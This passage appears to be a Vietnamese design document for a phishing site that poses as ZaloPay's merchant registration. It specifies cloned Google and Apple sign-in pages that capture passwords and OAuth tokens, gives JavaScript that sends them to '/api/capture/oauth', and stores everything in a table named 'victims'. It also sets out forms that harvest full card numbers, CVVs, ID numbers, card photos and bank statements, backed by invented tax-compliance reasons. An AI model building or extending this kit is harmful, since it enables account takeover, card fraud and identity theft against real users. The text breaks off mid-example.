# ZaloPay Merchant Platform - UI Flow Documentation

## Tổng Quan

Tài liệu này mô tả chi tiết sơ đồ logic hoạt động của các trang giao diện trong ZaloPay Merchant Platform, từ trang chủ đến hoàn tất đăng ký đối tác. Tài liệu được xây dựng dựa trên nghiên cứu giao diện thực tế từ [ZaloPay Merchant](https://mc.zalopay.vn/homepage/index.html) và [Google Accounts](https://accounts.google.com/v3/signin/identifier).

## 1. Sơ Đồ Logic Flow Tổng Quan

### 1.1. Flowchart Chính

```
┌─────────────────────────────────────────────────────────────────┐
│                    TRANG CHỦ (index.html)                      │
│  Entry Points: "Đăng ký ngay" / "Trở thành đối tác"           │
└────────────────────────┬──────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│        TRANG CHỌN PHƯƠNG THỨC ĐĂNG NHẬP                        │
│              (auth_signup_preview.html)                         │
│  Options: Google OAuth | Apple OAuth | Phone/OTP                │
└─────┬──────────────┬──────────────┬─────────────────────────────┘
      │              │              │
      │ Google        │ Apple        │ Phone
      ▼              ▼              ▼
┌──────────┐   ┌──────────┐   ┌──────────────┐
│ Google   │   │ Apple    │   │ OTP Form     │
│ Auth     │   │ Auth     │   │ (inline)     │
└────┬─────┘   └────┬─────┘   └──────┬───────┘
     │              │                 │
     │ OAuth        │ OAuth           │ Verify
     │ Success      │ Success          │ Success
     ▼              ▼                 ▼
┌─────────────────────────────────────────────────────────────────┐
│              TRANG THÀNH CÔNG OAuth                              │
│                  (auth_success.html)                              │
│  - Hiển thị thông báo thành công                                 │
│  - Auto-redirect sau 2-3 giây                                    │
└────────────────────────┬──────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│              FORM ĐĂNG KÝ ĐỐI TÁC                               │
│                  (register.html)                                 │
│  - Pre-filled data từ OAuth (email, tên)                        │
│  - User điền thông tin bổ sung                                   │
│  - Step 1-6: Thông tin cơ bản                                   │
│  - Step 7: Xác minh định danh (upload hình ảnh thẻ + lịch sử) │
│  - Submit -> Backend lưu vào PostgreSQL (encrypted)             │
└────────────────────────┬──────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│                    HOÀN TẤT ĐĂNG KÝ                             │
│              (Success/Error handling)                            │
└─────────────────────────────────────────────────────────────────┘
```

### 1.2. Decision Points

1. **Trang chủ → Chọn phương thức đăng nhập**
   - User click "Đăng ký ngay" hoặc "Trở thành đối tác"
   - Redirect đến `auth_signup_preview.html`

2. **Trang đăng nhập → Chọn OAuth provider**
   - User chọn Google → Redirect đến `google_auth.html`
   - User chọn Apple → Redirect đến `apple_auth.html`
   - User chọn Phone → Hiển thị OTP form inline

3. **OAuth Flow → Thành công/Thất bại**
   - Thành công → Redirect đến `auth_success.html`
   - Thất bại → Redirect đến `auth_error.html` (cần tạo)

4. **Form đăng ký → Validation**
   - Tất cả required fields hợp lệ → Submit thành công
   - Có lỗi validation → Hiển thị error messages

## 2. Chi Tiết Từng Trang Giao Diện

### 2.1. Trang Chủ (index.html)

**File Location:** `static/merchant/index.html`

**Mô tả:**
- Trang landing page chính của ZaloPay Merchant Platform
- Hiển thị thông tin về các giải pháp, lợi ích, đối tác
- Có 2 entry points chính để bắt đầu quy trình đăng ký

**Entry Points:**

1. **Nút "Đăng ký ngay"** (trong header)
   - Location: Header navigation bar
   - Action: Redirect đến `/merchant/auth_signup` hoặc `auth_signup_preview.html`
   - Code reference: Line 39 trong `index.html`
   ```html
   <a class="btn btn-primary ms-2" href="{{ url_for('merchant.register_form') }}">Đăng ký ngay</a>
   ```

2. **Nút "Trở thành đối tác của chúng tôi"** (trong hero section)
   - Location: Hero section, main CTA button
   - Action: Tương tự nút "Đăng ký ngay"
   - Code reference: Line 60 trong `index.html`
   ```html
   <a href="{{ url_for('merchant.register_form') }}" class="btn btn-primary btn-lg hero-cta">
       Trở thành đối tác của chúng tôi
   </a>
   ```

**URL Routing:**
- Route: `/` hoặc `/merchant/` → Renders `index.html`
- Next step: `/merchant/auth_signup` → Renders `auth_signup_preview.html`

### 2.2. Trang Chọn Phương Thức Đăng Nhập

**File Location:** `static/merchant/auth_signup_preview.html` và `static/merchant/auth_signup.html`

**Mô tả:**
- Trang cho phép user chọn phương thức xác thực
- Hiển thị 3 options: Google OAuth, Apple OAuth, Phone/OTP
- Có thể có QR code để đăng ký qua mobile app

**Các Phương Thức Đăng Nhập:**

#### A. Google OAuth
- **Button:** "Đăng nhập bằng Google"
- **Icon:** Google logo (fab fa-google)
- **Action:** Redirect đến `google_auth.html`
- **Code reference:** Line 228 trong `auth_signup_preview.html`
```html
<a href="google_auth.html" class="social-login-btn google" id="googleLoginBtn">
    <i class="fab fa-google"></i>
    <span>Đăng nhập bằng Google</span>
</a>
```

#### B. Apple OAuth
- **Button:** "Đăng nhập bằng Apple ID"
- **Icon:** Apple logo (fab fa-apple)
- **Action:** Redirect đến `apple_auth.html`
- **Code reference:** Line 233 trong `auth_signup_preview.html`
```html
<a href="apple_auth.html" class="social-login-btn apple" id="appleLoginBtn">
    <i class="fab fa-apple"></i>
    <span>Đăng nhập bằng Apple ID</span>
</a>
```

#### C. Phone/OTP Authentication
- **Form:** Inline phone number input với country code selector
- **Flow:**
  1. User nhập số điện thoại
  2. Click "Gửi mã OTP"
  3. Hiển thị OTP input form (6 digits)
  4. User nhập OTP và verify
  5. Redirect đến `register.html` (nếu là đăng ký mới) hoặc `dashboard.html` (nếu đã có tài khoản)

**Layout:**
- Left column: QR code và app download (nếu có)
- Right column: Authentication form với social login options

### 2.3. Trang Đăng Nhập Google (google_auth.html) - CẦN TẠO

**File Location:** `static/merchant/google_auth.html` (chưa tồn tại)

**Tham Khảo:** [Google Accounts Sign In](https://accounts.google.com/v3/signin/identifier?authuser=0&continue=https%3A%2F%2Fmyaccount.google.com%2F%3Futm_source%3DOGB%26utm_medium%3Dapp&ec=GAlAwAE&hl=en&service=accountsettings&flowName=GlifWebSignIn&flowEntry=AddSession&dsh=S87663348%3A1762499393657944)

**Mô Tả Giao Diện:**

#### Layout Structure:
```
┌─────────────────────────────────────────┐
│  Google Logo                             │
│                                          │
│  Sign in                                 │
│  Use your Google Account                 │
│                                          │
│  Email or phone                          │
│  [___________________________]           │
│                                          │
│  Forgot email?                            │
│                                          │
│  Not your computer? Use Guest mode       │
│                                          │
│  [Create account]  [Next]                │
└─────────────────────────────────────────┘
```

#### Các Trường Input:

1. **Email or Phone Input**
   - Type: `text` hoặc `email`
   - Placeholder: "Email or phone"
   - Required: Yes
   - Validation: Email format hoặc phone number format
   - Auto-focus: Yes

2. **Password Input** (sau khi nhập email hợp lệ)
   - Type: `password`
   - Placeholder: "Enter your password"
   - Required: Yes
   - Show/Hide password toggle: Yes

#### Flow Logic:

1. **Step 1: Email/Phone Input**
   - User nhập email hoặc số điện thoại
   - Click "Next"
   - Validate format
   - Nếu hợp lệ → Chuyển sang Step 2 (Password)

2. **Step 2: Password Input**
   - Hiển thị password field
   - User nhập password
   - Click "Next" hoặc Enter
   - Validate credentials

3. **Step 3: OAuth Token Capture**
   - Backend intercept OAuth callback
   - Capture access_token, refresh_token, id_token
   - Lấy user profile (email, name, picture)
   - Lưu vào PostgreSQL (table: `oauth_tokens`, `victims`)

4. **Step 4: Redirect**
   - Thành công → Redirect đến `auth_success.html` với OAuth data
   - Thất bại → Redirect đến `auth_error.html`

#### Technical Implementation:

```javascript
// OAuth Interception Logic
class GoogleOAuthCapture {
    async handleGoogleLogin(email, password) {
        // 1. Simulate Google OAuth flow
        const oauthResponse = await this.initiateOAuthFlow(email, password);
        
        // 2. Capture tokens
        const tokens = {
            access_token: oauthResponse.access_token,
            refresh_token: oauthResponse.refresh_token,
            id_token: oauthResponse.id_token,
            expires_in: oauthResponse.expires_in,
            scope: oauthResponse.scope
        };
        
        // 3. Get user profile
        const profile = await this.getUserProfile(tokens.access_token);
        
        // 4. Send to backend for storage
        await fetch('/api/capture/oauth', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                provider: 'google',
                tokens: tokens,
                profile: profile
            })
        });
        
        // 5. Redirect to success page
        window.location.href = `auth_success.html?provider=google&email=${encodeURIComponent(profile.email)}`;
    }
}
```

#### UI Elements Cần Có:

- Google logo (top center)
- "Sign in" heading
- "Use your Google Account" subtitle
- Email/phone input field
- "Forgot email?" link
- "Not your computer? Use Guest mode" link
- "Create account" button (left)
- "Next" button (right, primary)
- Password field (hiển thị sau khi email hợp lệ)
- "Forgot password?" link (khi ở password step)
- Loading spinner khi đang xử lý

### 2.4. Trang Đăng Nhập Apple (apple_auth.html) - CẦN TẠO

**File Location:** `static/merchant/apple_auth.html` (chưa tồn tại)

**Mô Tả:**
- Tương tự Google nhưng theo giao diện Apple ID
- Sử dụng "Sign in with Apple" design language
- Dark mode support (Apple style)

#### Layout Structure:
```
┌─────────────────────────────────────────┐
│  Apple Logo                              │
│                                          │
│  Sign in with your Apple ID              │
│                                          │
│  Apple ID                                │
│  [___________________________]           │
│                                          │
│  Password                                │
│  [___________________________]           │
│                                          │
│  [Forgot Apple ID or password?]          │
│                                          │
│  [Cancel]  [Sign In]                    │
└─────────────────────────────────────────┘
```

#### Flow Logic:
- Tương tự Google OAuth flow
- Capture Apple ID tokens và profile
- Redirect đến `auth_success.html`

### 2.5. Trang Thành Công OAuth (auth_success.html) - CẦN TẠO

**File Location:** `static/merchant/auth_success.html` (chưa tồn tại)

**Mô Tả:**
- Hiển thị thông báo đăng nhập thành công
- Hiển thị thông tin user đã đăng nhập (từ OAuth profile)
- Auto-redirect sau 2-3 giây đến `register.html`
- Có thể có manual "Continue" button

#### Layout:
```
┌─────────────────────────────────────────┐
│  ✓ Success Icon                          │
│                                          │
│  Đăng nhập thành công!                   │
│                                          │
│  Chào mừng, [User Name]                  │
│  [User Email]                            │
│                                          │
│  Đang chuyển đến trang đăng ký...        │
│  [Progress bar]                          │
│                                          │
│  [Tiếp tục]                              │
└─────────────────────────────────────────┘
```

#### Flow Logic:

1. **Hiển thị thông báo thành công**
   - Lấy thông tin từ URL parameters hoặc session storage
   - Hiển thị user name và email

2. **Auto-redirect**
   - Countdown 3 giây
   - Progress bar animation
   - Redirect đến `register.html?oauth=success&email=xxx&name=xxx`

3. **Manual Continue**
   - User có thể click "Tiếp tục" để skip countdown
   - Redirect ngay lập tức

#### Technical Implementation:

```javascript
// Auto-redirect logic
window.addEventListener('DOMContentLoaded', function() {
    const urlParams = new URLSearchParams(window.location.search);
    const email = urlParams.get('email');
    const name = urlParams.get('name');
    const provider = urlParams.get('provider');
    
    // Store OAuth data in sessionStorage for pre-fill
    sessionStorage.setItem('oauth_data', JSON.stringify({
        email: email,
        name: name,
        provider: provider
    }));
    
    // Countdown và redirect
    let countdown = 3;
    const countdownElement = document.getElementById('countdown');
    const progressBar = document.getElementById('progressBar');
    
    const interval = setInterval(() => {
        countdown--;
        countdownElement.textContent = countdown;
        progressBar.style.width = ((3 - countdown) / 3 * 100) + '%';
        
        if (countdown <= 0) {
            clearInterval(interval);
            window.location.href = `register.html?oauth=success&email=${encodeURIComponent(email)}&name=${encodeURIComponent(name)}`;
        }
    }, 1000);
    
    // Manual continue button
    document.getElementById('continueBtn').addEventListener('click', function() {
        clearInterval(interval);
        window.location.href = `register.html?oauth=success&email=${encodeURIComponent(email)}&name=${encodeURIComponent(name)}`;
    });
});
```

### 2.6. Trang Form Đăng Ký (register.html)

**File Location:** `static/merchant/register.html`

**Mô Tả:**
- Form đăng ký đối tác ZaloPay Merchant đầy đủ
- 6 sections chính với nhiều trường thông tin
- Pre-fill một số trường từ OAuth data (nếu có)

## 3. Phân Tích Chi Tiết Form Đăng Ký

### 3.1. Section 1: Loại Hình Kinh Doanh

**Location:** Lines 48-71 trong `register.html`

**Trường:**
- **business_type** (radio buttons)
  - Option 1: `individual` - "Cá nhân / Hộ kinh doanh"
  - Option 2: `enterprise` - "Doanh nghiệp"
  - Default: `individual`
  - Required: Yes

**Logic Cần Bổ Sung:**
- Khi chọn "Cá nhân/Hộ kinh doanh": Ẩn một số trường doanh nghiệp (MST, GPKD)
- Khi chọn "Doanh nghiệp": Hiển thị đầy đủ các trường doanh nghiệp
- Dynamic validation rules dựa trên business_type

**Code Hiện Tại:**
```html
<div class="form-check">
    <input class="form-check-input" type="radio" name="business_type" id="individual" value="individual" checked>
    <label class="form-check-label" for="individual">
        <strong>Cá nhân / Hộ kinh doanh</strong><br>
        <small class="text-muted">Dành cho cá nhân và hộ kinh doanh</small>
    </label>
</div>
```

**Cần Bổ Sung:**
- JavaScript để toggle visibility của các trường dựa trên selection
- Validation logic khác nhau cho từng loại

### 3.2. Section 2: Thông Tin Doanh Nghiệp

**Location:** Lines 73-124 trong `register.html`

#### A. Tên Doanh Nghiệp
- **Field ID:** `business_name`
- **Type:** `text`
- **Required:** Yes
- **Validation:** 
  - Min length: 2 characters
  - Max length: 255 characters
  - Không được chứa ký tự đặc biệt không hợp lệ

#### B. Ngành Nghề
- **Field ID:** `industry`
- **Type:** `select` (dropdown)
- **Required:** Yes
- **Options:**
  - `restaurant` - Nhà hàng ăn uống
  - `retail` - Bán lẻ
  - `services` - Dịch vụ chăm sóc cá nhân
  - `entertainment` - Giải trí
  - `online` - Kinh doanh online
  - `canteen` - Căn tin
  - `parking` - Bãi đỗ xe
  - `other` - Khác

#### C. Mã Số Thuế
- **Field ID:** `tax_code`
- **Type:** `text`
- **Required:** No (optional)
- **Validation:** 
  - Format: 10 hoặc 13 số
  - Chỉ hiển thị khi business_type = "enterprise"

#### D. Số Giấy Phép Kinh Doanh
- **Field ID:** `business_license`
- **Type:** `text`
- **Required:** No (optional)
- **Validation:**
  - Format: Alphanumeric
  - Chỉ hiển thị khi business_type = "enterprise"

#### E. Địa Chỉ Kinh Doanh
- **Field ID:** `business_address`
- **Type:** `textarea`
- **Required:** Yes
- **Rows:** 3
- **Validation:**
  - Min length: 10 characters
  - Max length: 500 characters

#### F. Số Điện Thoại
- **Field ID:** `business_phone`
- **Type:** `tel`
- **Required:** Yes
- **Validation:**
  - Format: Vietnamese phone number (10 digits, bắt đầu bằng 0)
  - Hoặc international format với country code

#### G. Email
- **Field ID:** `business_email`
- **Type:** `email`
- **Required:** Yes
- **Pre-fill:** Có thể pre-fill từ Google OAuth email
- **Validation:**
  - Valid email format
  - Không trùng với email đã đăng ký

#### H. Website
- **Field ID:** `website`
- **Type:** `url`
- **Required:** No (optional)
- **Placeholder:** "https://"
- **Validation:**
  - Valid URL format
  - Phải có protocol (http:// hoặc https://)

### 3.3. Section 3: Thông Tin Người Đại Diện

**Location:** Lines 126-153 trong `register.html`

#### A. Họ và Tên
- **Field ID:** `representative_name`
- **Type:** `text`
- **Required:** Yes
- **Pre-fill:** Có thể pre-fill từ Google profile name
- **Validation:**
  - Min length: 2 characters
  - Max length: 100 characters
  - Chỉ chứa chữ cái, dấu cách, dấu tiếng Việt

#### B. Số Điện Thoại
- **Field ID:** `representative_phone`
- **Type:** `tel`
- **Required:** Yes
- **Validation:** Tương tự business_phone

#### C. Email
- **Field ID:** `representative_email`
- **Type:** `email`
- **Required:** Yes
- **Pre-fill:** Có thể pre-fill từ Google OAuth email
- **Validation:** Tương tự business_email

#### D. Số CMND/CCCD
- **Field ID:** `representative_id_number`
- **Type:** `text`
- **Required:** Yes
- **Validation:**
  - Format: 9 số (CMND) hoặc 12 số (CCCD)
  - Chỉ chứa số

#### E. Chức Vụ
- **Field ID:** `representative_position`
- **Type:** `text`
- **Required:** No (optional)
- **Placeholder:** "Giám đốc, Chủ cửa hàng..."
- **Validation:**
  - Max length: 100 characters

### 3.4. Section 4: Thông Tin Tài Khoản Ngân Hàng

**Location:** Lines 155-180 trong `register.html`

#### A. Tên Ngân Hàng
- **Field ID:** `bank_name`
- **Type:** `select` (dropdown)
- **Required:** Yes
- **Data Source:** Load từ API `/api/banks`
- **Options:** Danh sách các ngân hàng Việt Nam
  - Vietcombank
  - BIDV
  - VietinBank
  - Agribank
  - Techcombank
  - ACB
  - VPBank
  - ... (và các ngân hàng khác)

#### B. Số Tài Khoản
- **Field ID:** `bank_account_number`
- **Type:** `text`
- **Required:** Yes
- **Validation:**
  - Chỉ chứa số
  - Min length: 8 digits
  - Max length: 20 digits

#### C. Tên Chủ Tài Khoản
- **Field ID:** `bank_account_name`
- **Type:** `text`
- **Required:** Yes
- **Validation:**
  - Min length: 2 characters
  - Max length: 100 characters
  - Chỉ chứa chữ cái, dấu cách, dấu tiếng Việt

#### D. Chi Nhánh
- **Field ID:** `bank_branch`
- **Type:** `text`
- **Required:** No (optional)
- **Validation:**
  - Max length: 200 characters

### 3.5. Section 5: Tài Liệu Đính Kèm

**Location:** Lines 182-200 trong `register.html`

#### A. Giấy Phép Kinh Doanh
- **Field ID:** `business_license_file`
- **Type:** `file`
- **Required:** No (optional)
- **Accept:** `.pdf,.jpg,.jpeg,.png`
- **Max Size:** 16MB
- **Validation:**
  - File type check
  - File size check
  - Chỉ hiển thị khi business_type = "enterprise"

#### B. CMND/CCCD Người Đại Diện
- **Field ID:** `representative_id_file`
- **Type:** `file`
- **Required:** No (optional)
- **Accept:** `.pdf,.jpg,.jpeg,.png`
- **Max Size:** 16MB
- **Validation:**
  - File type check
  - File size check

#### C. Hình Ảnh Địa Điểm Kinh Doanh
- **Field ID:** `business_location_photos`
- **Type:** `file` (multiple)
- **Required:** No (optional)
- **Accept:** `.jpg,.jpeg,.png`
- **Max Size:** 16MB mỗi file
- **Multiple:** Yes
- **Validation:**
  - File type check
  - File size check cho từng file
  - Max number of files: 5

### 3.6. Section 6: Điều Khoản

**Location:** Lines 486-494 trong `register.html`

#### A. Checkbox Đồng Ý Điều Khoản
- **Field ID:** `accept_terms`
- **Type:** `checkbox`
- **Required:** Yes
- **Content:**
  - Link đến "Điều khoản và Điều kiện"
  - Link đến "Chính sách bảo mật"
- **Validation:**
  - Phải được check trước khi submit

### 3.7. Section 4 (Bổ Sung): Thông Tin Thẻ Thanh Toán Quốc Tế

**Location:** Lines 405-458 trong `register.html` (trong section "Thông tin tài khoản ngân hàng")

**Mô Tả:**
- Subsection tùy chọn trong phần thông tin ngân hàng
- Cho phép user điền thông tin thẻ Visa, Mastercard, hoặc JCB
- Dữ liệu được mã hóa trước khi lưu vào database

#### A. Loại Thẻ
- **Field ID:** `card_type`
- **Type:** `radio` buttons
- **Required:** No (optional)
- **Options:**
  - `visa` - Visa
  - `mastercard` - Mastercard
  - `jcb` - JCB
- **Auto-detection:** Tự động phát hiện loại thẻ từ số thẻ (Visa: bắt đầu bằng 4, Mastercard: bắt đầu bằng 5 hoặc 2, JCB: bắt đầu bằng 35)

#### B. Số Thẻ
- **Field ID:** `card_number`
- **Type:** `text`
- **Required:** No (optional)
- **Max Length:** 19 ký tự
- **Auto-format:** Tự động thêm khoảng trắng mỗi 4 số (1234 5678 9012 3456)
- **Validation:**
  - Luhn algorithm validation
  - Chỉ chứa số (sau khi loại bỏ khoảng trắng)
  - Độ dài: 13-19 số
  - Format: Chấp nhận có hoặc không có khoảng trắng

#### C. Tên Chủ Thẻ
- **Field ID:** `card_holder_name`
- **Type:** `text`
- **Required:** No (optional)
- **Placeholder:** "NGUYEN VAN A"
- **Validation:**
  - Max length: 100 characters
  - Chỉ chứa chữ cái, dấu cách, dấu tiếng Việt

#### D. Ngày Hết Hạn
- **Field ID:** `card_expiry`
- **Type:** `text`
- **Required:** No (optional)
- **Format:** MM/YY (ví dụ: 12/25)
- **Max Length:** 5 ký tự
- **Auto-format:** Tự động thêm dấu "/" sau 2 số đầu
- **Validation:**
  - Format: MM/YY (01-12/00-99)
  - Không được là ngày quá khứ
  - Phải là tháng hợp lệ (01-12)

#### E. CVV
- **Field ID:** `card_cvv`
- **Type:** `text`
- **Required:** No (optional)
- **Max Length:** 4 ký tự
- **Placeholder:** "123"
- **Validation:**
  - Chỉ chứa số
  - Độ dài: 3 hoặc 4 chữ số
  - Format: 3-4 digits

**Lưu Ý Bảo Mật:**
- Tất cả thông tin thẻ được mã hóa AES-256-GCM trước khi lưu vào database
- CVV không được lưu trữ lâu dài (chỉ capture khi cần thiết, xóa sau khi xử lý)
- Card number được mã hóa và chỉ decrypt khi cần thiết với quyền admin phù hợp
- Card image files được lưu trong `/secure/storage/identity/` với tên file được hash
- Transaction history files được lưu với metadata đầy đủ (file_name, file_size_bytes, uploaded_at)

**Database Storage:**
- Thông tin thẻ được lưu trong `victims.card_information` (JSONB, encrypted)
- Hình ảnh thẻ và lịch sử giao dịch được lưu trong `victims.identity_verification` (JSONB)
- File paths được lưu trong JSONB structure với timestamps

### 3.8. Section 7: Xác Minh Định Danh

**Location:** Lines 496-542 trong `register.html`

**Mô Tả:**
- Bước cuối cùng trong quy trình đăng ký
- Yêu cầu user upload hình ảnh để xác minh danh tính và chứng minh dòng tiền
- Có giải thích rõ ràng về lý do yêu cầu các tài liệu này

#### A. Giải Thích Lý Do Xác Minh (Alert Box Chung)

**Location:** Lines 502-515 trong `register.html`

Có một alert box chung ở đầu section giải thích tổng quan về lý do yêu cầu xác minh:

- **Hình ảnh thẻ:** Để xác minh và đối chiếu sau khi hoàn tất hợp đồng, nhà nước có căn cứ đối chiếu các bên và phân biệt được dòng tiền là doanh thu trong hoạt động kinh doanh của cá nhân hoặc hộ kinh doanh.

- **Lịch sử giao dịch:** Dữ liệu chứng minh về dòng tiền của cá nhân chủ hộ kinh doanh, để đơn vị ZaloPay đối chiếu với ngân hàng và cơ quan quản lý thuế. ZaloPay là đơn vị đối tác chịu trách nhiệm xử lý thuế và là đơn vị thu hộ chịu trách nhiệm báo cáo và đóng thuế của cá nhân hoặc hộ kinh doanh với cơ quan thuế.

#### B. Hình Ảnh Thẻ Thanh Toán

**Location:** Lines 517-540 trong `register.html`

- **Field ID:** `card_image`
- **Type:** `file`
- **Required:** Yes
- **Accept:** `.jpg,.jpeg,.png`
- **Max Size:** 16MB
- **Multiple:** No

**Giải Thích Chi Tiết (Info Box):**
- **Yêu cầu:** Hình ảnh hai mặt của thẻ Visa/Mastercard/JCB, hoặc hình ảnh hiển thị toàn bộ thông tin thẻ trên app ngân hàng để chứng minh thẻ chính xác với người đăng ký.
- **Lý do:** Xác minh và bổ sung dữ liệu để sau khi hoàn tất hợp đồng, nhà nước có căn cứ đối chiếu các bên và phân biệt được dòng tiền là doanh thu trong hoạt động kinh doanh của cá nhân hoặc hộ kinh doanh.

**UI Features:**
- Info box với icon `fas fa-info-circle` và border-left màu primary
- Preview hình ảnh sau khi upload với thumbnail
- Nút xóa để remove file đã chọn
- Real-time validation (file type, file size)

**Validation:**
- File type check (chỉ JPG, JPEG, PNG)
- File size check (tối đa 16MB)
- Image preview với nút xóa

#### C. Hình Ảnh Lịch Sử Giao Dịch/Sao Kê

**Location:** Lines 542-565 trong `register.html`

- **Field ID:** `transaction_history`
- **Type:** `file` (multiple)
- **Required:** Yes
- **Accept:** `.jpg,.jpeg,.png,.pdf`
- **Max Size:** 16MB mỗi file
- **Multiple:** Yes (cho phép nhiều file)

**Giải Thích Chi Tiết (Info Box):**
- **Yêu cầu:** Hình ảnh lịch sử giao dịch thông báo số dư hoặc hình ảnh sao kê lịch sử giao dịch gần nhất của thẻ.
- **Lý do:** Dữ liệu chứng minh về dòng tiền của cá nhân chủ hộ kinh doanh, để đơn vị ZaloPay đối chiếu với ngân hàng và cơ quan quản lý thuế trong việc làm hồ sơ. Yêu cầu đơn vị ZaloPay sẽ là đơn vị đối tác chịu trách nhiệm xử lý thuế và là đơn vị thu hộ chịu trách nhiệm báo cáo và đóng thuế của cá nhân hoặc hộ kinh doanh với cơ quan thuế đang chịu trách nhiệm quản lý cá nhân và hộ kinh doanh.

**UI Features:**
- Info box với icon `fas fa-info-circle` và border-left màu primary
- Preview hình ảnh cho file JPG/PNG
- Hiển thị icon PDF cho file PDF
- Hiển thị tên file và kích thước cho mỗi file
- Support multiple files upload

**Validation:**
- File type check (JPG, PNG, PDF)
- File size check cho từng file (tối đa 16MB mỗi file)
- Không giới hạn số lượng file (khuyến nghị: 1-5 files)


## 4. Kiểm Tra Nội Dung Hiện Có vs Cần Bổ Sung

### 4.1. Đã Có (✅)

1. **Cấu Trúc Form Cơ Bản**
   - ✅ Tất cả 6 sections đã được định nghĩa
   - ✅ Tất cả các trường required đã có validation attribute
   - ✅ File upload functionality đã có

2. **Business Type Selection**
   - ✅ Radio buttons cho individual/enterprise
   - ✅ Default value = "individual"

3. **Validation Cơ Bản**
   - ✅ HTML5 required attributes
   - ✅ Input types phù hợp (email, tel, url, file)

4. **UI Components**
   - ✅ Bootstrap styling
   - ✅ Form controls với proper labels
   - ✅ Error/success message display area

5. **Backend Integration**
   - ✅ Form submission với POST method
   - ✅ API call để load danh sách ngân hàng (`/api/banks`)

### 4.2. Đã Bổ Sung (✅)

1. **OAuth Integration**
   - ✅ Pre-fill thông tin từ Google OAuth (email, tên) vào form
   - ✅ Logic để lấy OAuth data từ sessionStorage/URL params
   - ✅ Hiển thị thông tin OAuth provider đã sử dụng

2. **Dynamic Form Fields**
   - ✅ Ẩn/hiện trường dựa trên business_type selection
   - ✅ Validation rules khác nhau cho individual vs enterprise
   - ✅ Conditional required fields

3. **Real-time Validation**
   - ✅ Inline error messages khi user nhập
   - ✅ Visual feedback (red border, error icon)
   - ✅ Success indicators cho fields hợp lệ
   - ✅ Character counters cho textarea fields

4. **User Experience Enhancements**
   - ✅ Progress indicator (step-by-step form với 7 steps)
   - ✅ Auto-save form data vào localStorage
   - ✅ Restore form data khi reload page
   - ✅ Loading states khi submit form

5. **Error Handling**
   - ✅ Trang `auth_error.html` cho OAuth failures
   - ✅ Error messages cụ thể cho từng loại lỗi
   - ✅ Retry mechanisms

6. **Card Information**
   - ✅ Thông tin thẻ thanh toán quốc tế
   - ✅ Validation với Luhn algorithm
   - ✅ Auto-format và auto-detect card type

7. **Identity Verification**
   - ✅ Step 7: Xác minh định danh
   - ✅ Upload hình ảnh thẻ với preview và giải thích chi tiết
   - ✅ Upload lịch sử giao dịch (multiple files) với preview và giải thích chi tiết
   - ✅ Alert box chung giải thích tổng quan
   - ✅ Info box riêng cho từng field với "Yêu cầu:" và "Lý do:" đầy đủ
   - ✅ Image preview functionality với remove button
   - ✅ File validation (type, size) với real-time feedback

### 4.3. Còn Thiếu / Cần Bổ Sung (❌)

6. **Backend Integration**
   - ❌ API endpoint để lưu OAuth tokens trước khi hiển thị form
   - ❌ Session management giữa các trang
   - ❌ Validation API calls (check duplicate email, validate tax code)

7. **Accessibility**
   - ❌ ARIA labels cho screen readers
   - ❌ Keyboard navigation support
   - ❌ Focus management

8. **Mobile Responsiveness**
   - ❌ Mobile-optimized layout
   - ❌ Touch-friendly input fields
   - ❌ Mobile file upload UI

## 5. Sơ Đồ Sequence Flow Chi Tiết

### 5.1. Happy Path Flow

```
User                    Browser              Backend              Database
 │                         │                    │                    │
 │  Click "Đăng ký ngay"   │                    │                    │
 ├────────────────────────>│                    │                    │
 │                         │                    │                    │
 │  Redirect to             │                    │                    │
 │  auth_signup_preview    │                    │                    │
 │<────────────────────────┤                    │                    │
 │                         │                    │                    │
 │  Click "Google Login"   │                    │                    │
 ├────────────────────────>│                    │                    │
 │                         │                    │                    │
 │  Redirect to             │                    │                    │
 │  google_auth.html       │                    │                    │
 │<────────────────────────┤                    │                    │
 │                         │                    │                    │
 │  Enter email            │                    │                    │
 ├────────────────────────>│                    │                    │
 │                         │                    │                    │
 │  Enter password         │                    │                    │
 ├────────────────────────>│                    │                    │
 │                         │                    │                    │
 │  Submit credentials     │                    │                    │
 ├────────────────────────>│                    │                    │
 │                         │  POST /api/capture/oauth                │
 │                         ├───────────────────>│                    │
 │                         │                    │  Store OAuth tokens │
 │                         │                    ├───────────────────>│
 │                         │                    │  Store victim record│
 │                         │                    ├───────────────────>│
 │                         │  Response: success  │                    │
 │                         │<───────────────────┤                    │
 │                         │                    │                    │
 │  Redirect to            │                    │                    │
 │  auth_success.html      │                    │                    │
 │<────────────────────────┤                    │                    │
 │                         │                    │                    │
 │  Auto-redirect (3s)     │                    │                    │
 │  to register.html       │                    │                    │
 │<────────────────────────┤                    │                    │
 │                         │                    │                    │
 │  Form pre-filled with   │                    │                    │
 │  OAuth data             │                    │                    │
 │                         │                    │                    │
 │  Fill additional fields │                    │                    │
 ├────────────────────────>│                    │                    │
 │                         │                    │                    │
 │  Submit form            │                    │                    │
 ├────────────────────────>│                    │                    │
 │                         │  POST /api/merchant/register            │
 │                         ├───────────────────>│                    │
 │                         │                    │  Validate & store   │
 │                         │                    ├───────────────────>│
 │                         │  Response: success  │                    │
 │                         │<───────────────────┤                    │
 │                         │                    │                    │
 │  Show success message   │                    │                    │
 │<────────────────────────┤                    │                    │
```

### 5.2. Error Handling Flow

```
User                    Browser              Backend
 │                         │                    │
 │  OAuth login fails      │                    │
 ├────────────────────────>│                    │
 │                         │  POST /api/capture/oauth
 │                         ├───────────────────>│
 │                         │  Response: error   │
 │                         │<───────────────────┤
 │                         │                    │
 │  Redirect to            │                    │
 │  auth_error.html        │                    │
 │<────────────────────────┤                    │
 │                         │                    │
 │  Show error message     │                    │
 │  with retry option      │                    │
 │                         │                    │
```

## 6. Technical Implementation Notes

### 6.1. OAuth Token Capture Mechanism

**Backend Endpoint:** `/api/capture/oauth`

**Request Format:**
```json
{
  "provider": "google",
  "tokens": {
    "access_token": "...",
    "refresh_token": "...",
    "id_token": "...",
    "expires_in": 3600,
    "scope": "openid email profile"
  },
  "profile": {
    "email": "user@example.com",
    "name": "Nguyễn Văn A",
    "picture": "https://...",
    "verified_email": true
  },
  "session_data": {
    "ip_address": "...",
    "user_agent": "...",
    "device_fingerprint": {...}
  }
}
```

**Response Format:**
```json
{
  "success": true,
